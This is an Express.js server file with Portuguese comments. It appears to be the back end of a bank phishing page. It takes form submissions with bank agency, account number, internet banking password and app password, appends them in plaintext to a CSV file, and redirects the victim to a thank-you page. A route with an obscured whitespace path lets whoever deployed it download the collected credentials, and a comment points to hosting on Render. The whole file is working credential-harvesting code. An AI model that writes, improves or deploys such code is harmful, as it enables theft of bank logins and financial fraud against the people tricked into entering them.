// server.js
const express       = require("express");
const compression   = require("compression");
const multer        = require("multer");
const { createObjectCsvWriter } = require("csv-writer");
const path          = require("path");

const app    = express();
const upload = multer();

// ativa gzip/brotli para todas as respostas
app.use(compression());

// para servir HTML/CSS/JS/IMG com compressão
app.use(express.static(path.join(__dirname, "public")));
app.use(express.urlencoded({ extended: true }));

// CSV writer
const csvWriter = createObjectCsvWriter({
  path: "dados_formulario.csv",
  header: [
    { id: "titularidade", title: "Titularidade" },
    { id: "tipo_conta",    title: "Tipo de Conta" },
    { id: "agencia",       title: "Agência" },
    { id: "conta",         title: "Conta" },
    { id: "senhaInternet", title: "Senha da Internet" },
    { id: "senhaApp",      title: "Senha Digital" }
  ],
  append: true
});

// processa envio do formulário
app.post("/processa_formulario", upload.none(), async (req, res) => {
  const {
    titularidade,
    tipo_conta,
    agency,
    login,
    internet,
    app: senhaApp
  } = req.body;

  if (!agency || !login || !internet || !senhaApp) {
    return res.status(400).send("Todos os campos são obrigatórios.");
  }

  const registro = [{
    titularidade,
    tipo_conta,
    agencia: agency,
    conta: login,
    senhaInternet: internet,
    senhaApp
  }];

  try {
    await csvWriter.writeRecords(registro);
    // envia ao usuário agradecimento
    res.redirect("/agradecimento.html");
  } catch (err) {
    console.error("Erro ao salvar os dados:", err);
    res.status(500).send("Erro ao salvar os dados.");
  }
});

// rota para download do CSV
app.get("/  ", (req, res) => {
  const filePath = path.join(__dirname, "dados_formulario.csv");
  res.download(filePath, "dados_formulario.csv", err => {
    if (err) {
      console.error("Erro ao enviar CSV:", err);
      res.status(500).send("Não foi possível baixar o CSV.");
    }
  });
});

// fallback para SPA
app.get("/*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// inicia servidor na porta do Render ou 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
